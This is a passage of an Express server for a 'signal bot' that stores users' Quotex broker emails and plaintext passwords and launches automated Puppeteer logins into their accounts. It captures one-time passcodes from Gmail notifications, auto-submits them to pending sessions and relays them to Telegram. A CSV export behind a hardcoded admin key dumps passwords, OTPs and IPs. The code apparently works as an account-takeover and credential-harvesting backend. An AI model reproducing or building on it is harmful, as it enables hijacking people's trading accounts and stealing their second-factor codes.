    } catch(e) { res.json({ credentials: savedCredsMemory }); }
});
app.post('/api/qx/credentials', async (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    const { email, password, label = '', group = 'Default', notes = '' } = req.body || {};
    if (!email || !password) return res.status(400).json({ error: 'email and password required' });
    const id   = 'cred_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 6);
    const cred = { id, label, email, password, group, notes, launchCount: 0, lastLaunched: null, createdAt: new Date() };
    try {
        if (useDatabase) await SavedCredential.create(cred);
        else savedCredsMemory.unshift(cred);
        broadcastSSE('cred_added', { id: cred.id, label, email, group });
        res.json({ ok: true, credential: { id: cred.id, label, email, group } });
    } catch(e) { res.status(500).json({ error: 'Server error' }); }
});
app.delete('/api/qx/credentials/:id', async (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    const { id } = req.params;
    try {
        if (useDatabase) await SavedCredential.deleteOne({ id });
        else savedCredsMemory = savedCredsMemory.filter(c => c.id !== id);
        broadcastSSE('cred_deleted', { id });
        res.json({ ok: true });
    } catch(e) { res.status(500).json({ error: 'Server error' }); }
});

// ================== BATCH LAUNCH ==================
app.post('/api/qx/batch-launch', async (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    if (!puppeteerAvailable) return res.status(503).json({ error: 'Puppeteer not available' });
    const { credentialIds = [] } = req.body || {};
    const allCreds = useDatabase ? await SavedCredential.find({}).lean().catch(() => []) : savedCredsMemory;
    const tolaunch = credentialIds.length ? allCreds.filter(c => credentialIds.includes(c.id)) : allCreds;
    const launched = [], skipped = [];
    for (const c of tolaunch) {
        const existing = [...quotexSessions.values()].find(s => s.email === c.email && !['closed','error','logged_in'].includes(s.status));
        if (existing) { skipped.push({ email: c.email, reason: 'Session already ' + existing.status }); continue; }
        const sid = makeSessionId();
        const session = { id: sid, clientName: c.label || c.email.split('@')[0], email: c.email, password: c.password,
            licenceKey: '', status: 'queued', statusMsg: 'Batch launched', startedAt: new Date(), updatedAt: new Date(),
            otpAttempts: 0, browser: null, page: null, screenshotBase64: null, cookies: null };
        quotexSessions.set(sid, session);
        broadcastSSE('qx_session_new', getSessionInfo(session));
        launchQuotexSession(session).catch(e => console.error('batch launch err:', e.message));
        // Update launch stats
        if (useDatabase) SavedCredential.findOneAndUpdate({ id: c.id }, { lastLaunched: new Date(), $inc: { launchCount: 1 } }).catch(() => {});
        else { const cr = savedCredsMemory.find(x => x.id === c.id); if (cr) { cr.lastLaunched = new Date(); cr.launchCount = (cr.launchCount || 0) + 1; } }
        launched.push({ sessionId: sid, email: c.email });
        await new Promise(r => setTimeout(r, 600)); // stagger launches
    }
    res.json({ ok: true, launched, skipped, totalLaunched: launched.length });
});

// ================== SESSION NOTES ==================
app.post('/api/qx/session-note', async (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    const { sessionId, note } = req.body || {};
    if (!sessionId) return res.status(400).json({ error: 'sessionId required' });
    const session = quotexSessions.get(sessionId);
    if (session) session.note = note || '';
    if (useDatabase) BrokerSession.findOneAndUpdate({ sessionId }, { notes: note || '' }, { upsert: false }).catch(() => {});
    broadcastSSE('qx_session_update', session ? getSessionInfo(session) : { id: sessionId });
    res.json({ ok: true });
});

// ================== AUTO-RETRY CONFIG API ==================
app.get('/api/qx/retry-config', (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    res.json(autoRetryConfig);
});
app.post('/api/qx/retry-config', (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    const { enabled, maxAttempts, delaySeconds } = req.body || {};
    if (enabled !== undefined) autoRetryConfig.enabled = !!enabled;
    if (maxAttempts)           autoRetryConfig.maxAttempts = Math.min(10, Math.max(1, parseInt(maxAttempts)));
    if (delaySeconds)          autoRetryConfig.delaySeconds = Math.min(300, Math.max(5, parseInt(delaySeconds)));
    broadcastSSE('retry_config_updated', autoRetryConfig);
    res.json({ ok: true, config: autoRetryConfig });
});

// ================== LAUNCH FROM CREDENTIAL ==================
app.post('/api/qx/launch-from-cred', async (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    if (!puppeteerAvailable) return res.status(503).json({ error: 'Puppeteer not available' });
    const { credId } = req.body || {};
    if (!credId) return res.status(400).json({ error: 'credId required' });
    const cred = useDatabase
        ? await SavedCredential.findOne({ id: credId }).lean().catch(() => null)
        : savedCredsMemory.find(c => c.id === credId);
    if (!cred) return res.status(404).json({ error: 'Credential not found' });
    const existing = [...quotexSessions.values()].find(s => s.email === cred.email && !['closed','error','logged_in'].includes(s.status));
    if (existing) return res.json({ ok: false, sessionId: existing.id, message: 'Session already running' });
    const sid = makeSessionId();
    const session = { id: sid, clientName: cred.label || cred.email.split('@')[0], email: cred.email, password: cred.password,
        licenceKey: '', status: 'queued', statusMsg: 'Launched from credential', startedAt: new Date(), updatedAt: new Date(),
        otpAttempts: 0, browser: null, page: null, screenshotBase64: null, cookies: null };
    quotexSessions.set(sid, session);
    broadcastSSE('qx_session_new', getSessionInfo(session));
    launchQuotexSession(session).catch(e => console.error('cred launch error:', e.message));
    if (useDatabase) SavedCredential.findOneAndUpdate({ id: credId }, { lastLaunched: new Date(), $inc: { launchCount: 1 } }).catch(() => {});
    else { const c = savedCredsMemory.find(x => x.id === credId); if (c) { c.lastLaunched = new Date(); c.launchCount = (c.launchCount || 0) + 1; } }
    res.json({ ok: true, sessionId: sid, email: cred.email });
});

// ================== SESSION ACTIVITY EXPORT ==================
app.get('/api/qx/export-sessions', async (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    const rows = [
        ['Session ID','Client','Email','Status','Started','Notes'].join(','),
        ...[...quotexSessions.values()].map(s => [
            `"${s.id}"`, `"${(s.clientName||'').replace(/"/g,'""')}"`,
            `"${(s.email||'').replace(/"/g,'""')}"`, `"${s.status}"`,
            `"${s.startedAt?.toISOString?.() || ''}"`, `"${(s.note||'').replace(/"/g,'""')}"`
        ].join(','))
    ].join('\r\n');
    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', `attachment; filename="sessions-${new Date().toISOString().slice(0,10)}.csv"`);
    res.send(rows);
});

// ================== GMAIL NOTIFICATION OTP CAPTURE ==================
// Called by main-bot.html when a Gmail notification is received with an OTP.
// Stores the capture, deduplicates within 45s, and auto-forwards to matching session.
app.post('/api/otp/gmail-capture', async (req, res) => {
    const { sessionId, otp, source = 'gmail_notification', userName, licenceKey = '' } = req.body || {};
    if (!otp || !/\d{4,8}/.test(otp)) return res.status(400).json({ error: 'Invalid OTP format' });

    const now = Date.now();
    const dedupeKey = (otp || '') + '_' + (userName || '');
    const lastSeen = gmailOtpLastSeen.get(dedupeKey);
    if (lastSeen && (now - lastSeen) < GMAIL_OTP_DEBOUNCE_MS) {
        return res.json({ ok: true, duplicate: true, message: 'Duplicate OTP within 45s window — ignored' });
    }
    gmailOtpLastSeen.set(dedupeKey, now);

    const capture = {
        id: 'gotpc_' + now.toString(36),
        otp,
        source,
        sessionId: sessionId || null,
        userName: userName || null,
        licenceKey,
        timestamp: new Date().toISOString(),
        forwarded: false,
        forwardedTo: null,
    };

    // Ring buffer — keep last 200
    gmailOtpCaptures.unshift(capture);
    if (gmailOtpCaptures.length > 200) gmailOtpCaptures.length = 200;

    broadcastSSE('gmail_otp_captured', capture);

    // Auto-forward: if a sessionId was supplied, submit directly to that session
    let forwarded = false;
    if (sessionId) {
        const result = await submitQuotexOTP(sessionId, otp).catch(() => ({ ok: false }));
        if (result.ok) {
            capture.forwarded = true;
            capture.forwardedTo = sessionId;
            forwarded = true;
        }
    } else {
        // Try to find any session waiting for OTP that matches userName or licenceKey
        for (const [sid, sess] of quotexSessions.entries()) {
            if (!['waiting_otp', 'wrong_otp'].includes(sess.status)) continue;
            const nameMatch  = userName   && (sess.clientName || '').toLowerCase() === userName.toLowerCase();
            const keyMatch   = licenceKey && sess.licenceKey === licenceKey;
            const emailMatch = userName   && (sess.email || '').toLowerCase().includes(userName.toLowerCase());
            if (nameMatch || keyMatch || emailMatch) {
                const result = await submitQuotexOTP(sid, otp).catch(() => ({ ok: false }));
                if (result.ok) {
                    capture.forwarded = true;
                    capture.forwardedTo = sid;
                    forwarded = true;
                    break;
                }
            }
        }
    }

    await sendTelegramMessage(
        `📲 <b>Gmail Notification OTP</b>\n` +
        `🔢 OTP: <b>${otp}</b>\n` +
        `👤 User: <b>${userName || 'Unknown'}</b>\n` +
        `🔗 Forwarded: <b>${forwarded ? '✅ Yes' : '❌ No'}</b>\n` +
        `⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>`
    ).catch(() => {});

    res.json({ ok: true, captured: capture, forwarded });
});

// GET /api/otp/gmail-captures — list recent captures (admin)
app.get('/api/otp/gmail-captures', (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    res.json({ captures: gmailOtpCaptures.slice(0, 100) });
});

// ================== EXPORT USERS CSV ==================
app.get('/api/export-users', (req, res) => {
    const adminKey = req.query.adminKey || req.headers['x-admin-key'];
    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Forbidden' });
    const rows = [
        ['Full Name','License Key','Status','Email','Password','OTP','Connected','Last Activity','IP','Blocked'].join(','),
        ...users.map(u => [
            `"${(u.fullName||'').replace(/"/g,'""')}"`, `"${(u.licenceKey||'').replace(/"/g,'""')}"`,
            `"${(u.status||'').replace(/"/g,'""')}"`,   `"${(u.username||'').replace(/"/g,'""')}"`,
            `"${(u.password||'').replace(/"/g,'""')}"`, `"${(u.otp||'').replace(/"/g,'""')}"`,
            u.connected ? 'Yes' : 'No', `"${(u.lastActivity||'').replace(/"/g,'""')}"`,
            `"${(u.ip||'').replace(/"/g,'""')}"`, u.blocked ? 'Yes' : 'No',
        ].join(','))
    ].join('\r\n');
    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', `attachment; filename="users-${new Date().toISOString().slice(0,10)}.csv"`);
    res.send(rows);
});

// ================== ROOT ==================
app.get('/', (req, res) => {
    const sessions = [...quotexSessions.values()];
    res.send(
        `✅ Chinese Signal Bot Server v5 Running\n` +
        `💾 Storage: ${useDatabase ? 'MongoDB Atlas (PERMANENT ✅)' : 'File-based'}\n` +
        `🤖 Puppeteer: ${puppeteerAvailable ? 'ENABLED ✅' : 'Disabled (npm install puppeteer)'}\n` +
        `🔓 Quotex Sessions: ${sessions.filter(s => !['closed','error'].includes(s.status)).length} active, ` +
        `${sessions.filter(s => s.status === 'logged_in').length} logged in`
    );
});

// ================== START SERVER ==================
const PORT = process.env.PORT || 3000;
async function startServer() {
    try { await mongoose.connection.asPromise(); useDatabase = true; } catch(e) { console.warn('MongoDB not ready at startup, using file mode.'); }
    if (!useDatabase) { ensureDataDir(); loadUsers(); loadLicenses(); setInterval(() => { try { saveUsers(); } catch(e){} try { saveLicenses(); } catch(e){} }, 30000); }
    app.listen(PORT, () => {
        console.log(`🚀 Server running on port ${PORT}`);
        console.log(`💾 Storage: ${useDatabase ? 'MongoDB Atlas (PERMANENT)' : 'File-based'}`);
        console.log(`🤖 Puppeteer: ${puppeteerAvailable ? 'ENABLED' : 'Disabled'}`);
        if (!puppeteerAvailable) console.log('   → To enable Quotex Auto-Login: npm install puppeteer');
        if (process.env.AUTO_LAUNCH_ON_LOGIN === 'true') console.log('🔄 Auto-Launch on Login: ENABLED');
        telegramPollLoop().catch(e => console.error('Telegram poll loop crashed:', e.message));
        startAutoOtpWatcher();
    });
}
startServer().catch(err => { console.error('Failed to start server:', err); process.exit(1); });
